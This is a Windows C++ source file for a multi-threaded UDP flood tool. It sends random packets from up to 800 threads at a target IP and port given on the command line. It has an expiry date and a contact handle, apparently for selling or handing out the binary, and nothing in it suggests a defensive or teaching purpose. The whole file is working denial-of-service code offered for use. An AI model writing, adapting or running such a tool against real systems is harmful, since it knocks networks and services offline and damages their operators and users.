#include <iostream>
#include <thread>
#include <vector>
#include <mutex>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <winsock2.h> // Windows-specific networking
#include <ws2tcpip.h> // For inet_pton and other utilities

#pragma comment(lib, "Ws2_32.lib") // Link with Ws2_32.lib

// Constants
#define PACKET_SIZE 65507  // Maximum UDP payload size (65507 bytes)
#define PAYLOAD_SIZE 1450  // Recommended payload size for most networks

const int EXPIRY_DAY = 30;
const int EXPIRY_MONTH = 12;
const int EXPIRY_YEAR = 2026;

const int DEFAULT_THREAD_COUNT = 800;

std::mutex log_mutex;

// Function to generate a random payload
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Function to check if the binary has expired
bool is_binary_expired() {
    time_t now = time(nullptr);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
         current_time->tm_mday > EXPIRY_DAY)) {
        return true;
    }
    return false;
}

// UDP attack function for each thread
void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];

    // Initialize the socket
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << WSAGetLastError() << std::endl;
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
        closesocket(sock);
        return;
    }

    generate_payload(buffer, PAYLOAD_SIZE);

    time_t start_time = time(nullptr);
    while (time(nullptr) - start_time < attack_time) {
        int sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent == SOCKET_ERROR) {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << WSAGetLastError() << std::endl;
        }
    }

    closesocket(sock);
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
}

// Multi-threaded UDP attack manager
void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
    std::vector<std::thread> threads;

    std::cout << "Starting UDP flood attack with " << thread_count << " threads..." << std::endl;

    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
    }

    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "UDP flood attack completed." << std::endl;
}

// Get thread count from command line arguments or use default
int get_thread_count(int argc, char *argv[]) {
    if (argc == 5) {
        return std::stoi(argv[4]);
    }
    return DEFAULT_THREAD_COUNT;
}

int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = get_thread_count(argc, argv);

    if (is_binary_expired()) {
        std::cerr << "Error: This binary has expired. Please contact @NNUCLEAR_OP." << std::endl;
        return EXIT_FAILURE;
    }

    // Initialize Winsock
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        std::cerr << "Error: Failed to initialize Winsock. " << WSAGetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    multi_threaded_udp_attack(ip, port, duration, thread_count);

    // Cleanup Winsock
    WSACleanup();

    return EXIT_SUCCESS;
}
